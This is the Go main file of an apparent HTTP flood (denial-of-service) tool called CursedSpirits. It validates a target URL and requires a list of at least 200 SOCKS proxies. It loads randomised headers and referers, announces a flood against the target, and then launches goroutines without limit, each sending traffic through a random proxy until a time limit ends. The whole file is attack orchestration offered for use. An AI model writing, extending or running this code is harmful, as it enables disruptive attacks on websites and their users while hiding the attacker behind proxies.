package main

import (
	"fmt"
	"log"
	"math/rand"
	"os"
	"os/signal"
	"path/filepath"
	"runtime"
	"slices"
	"strings"
	"syscall"
	"time"

	"Pix4Devs/CursedSpirits/bot"
	"Pix4Devs/CursedSpirits/cmd"
	"Pix4Devs/CursedSpirits/fancy"
	"Pix4Devs/CursedSpirits/filesystem"
	"Pix4Devs/CursedSpirits/globals"
)

var (
	TARGET          = &globals.TARGET
	CONCURRENCY     = &globals.CONCURRENCY
	DURATION        = &globals.DURATION
	PROXY_TYPE      = &globals.PROXY_TYPE
	VALID_PROTOCOLS = &globals.VALID_PROTOCOLS
)

func main() {
	logo := fancy.ConcatLogo()
	logo.Colorize()

	fmt.Println(*logo + "\n\n")

	cmd.Init()
	if err := cmd.RootCmd.Execute(); err != nil {
		log.Fatal(err)
	}

	if slices.ContainsFunc(os.Args, func(s string) bool {
		if strings.Contains(s, "--help") {
			return true
		}
		return false
	}) {
		os.Exit(0)
	}

	if !strings.Contains(*TARGET, "http://") && !strings.Contains(*TARGET, "https://") {
		log.Fatal("http:// or https:// scheme required for 'url' option, see <bin> -help for more info")
	}

	var valid bool
	for i := 0; i < len((*VALID_PROTOCOLS)); i++ {
		// fmt.Println((*VALID_PROTOCOLS)[i])
		if (*VALID_PROTOCOLS)[i] == *PROXY_TYPE {
			valid = true
			break
		}
	}

	if !valid {
		log.Fatal("Proxy protocol can be only socks4 or socks5, see <bin> -help for more info")
	}

	cores := runtime.NumCPU()
	runtime.GOMAXPROCS(cores)

	base, err := os.Getwd()
	if err != nil {
		log.Fatal(err)
	}

	fileEntry := map[string]interface{}{
		"accepts.txt": &globals.ACCEPTS,
		"proxies.txt": &globals.PROXIES,
		"refs.txt":    &globals.REFS,
	}

	for k, v := range fileEntry {
		data := filesystem.Read(filepath.Join(base, "context", k))
		*v.(*[]string) = data
	}

	v, _ := fileEntry["proxies.txt"].(*[]string)
	if len(*v) < 200 {
		log.Fatal("Requires minimum of 200 proxies")
	}

	f := &bot.FloodCtx{
		Target:      *TARGET,
		Concurrency: *CONCURRENCY,
		StopAt:      int(time.Now().Add(time.Second * time.Duration(*DURATION)).Unix()),
		Protocol: *PROXY_TYPE,
	}

	fancy.PrintCtx("Started flood against '" + *TARGET + "'")
	fmt.Println()


	exit := make(chan os.Signal) 
	signal.Notify(exit, os.Interrupt, syscall.SIGINT)

	// setup one listener for signal interruption like ctrl+c
	go func(){
		<-exit
		os.Exit(0)
	}()

	for {
		go func() {
			f.Jujutsu(globals.PROXIES[rand.Intn(len(globals.PROXIES))])
		}()
	}
}
